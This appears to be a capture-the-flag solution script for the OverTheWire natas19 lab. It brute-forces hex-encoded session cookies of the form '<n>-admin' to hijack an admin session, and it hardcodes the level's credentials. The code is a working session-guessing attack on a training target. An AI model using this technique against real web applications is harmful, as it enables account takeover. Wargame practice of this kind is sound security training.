#!usr/bin/python

import requests, binascii
URL = "http://natas19.natas.labs.overthewire.org/index.php"
USER = "natas19"
PASS = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

def check_admin(value):
    r = requests.get(URL, cookies = {'PHPSESSID':value}, auth = (USER,PASS))
    if "You are an admin" in r.text:
        return True
    else:
        return False

def cookie_loop():
    for k in range(0,640):
        value = (str(binascii.hexlify(str(k)+"-admin"))).replace("b","").replace("'","")
        if check_admin(value) is True:
            print value
            break
        else:
            print str(k) + " Not this one"

cookie_loop()
        
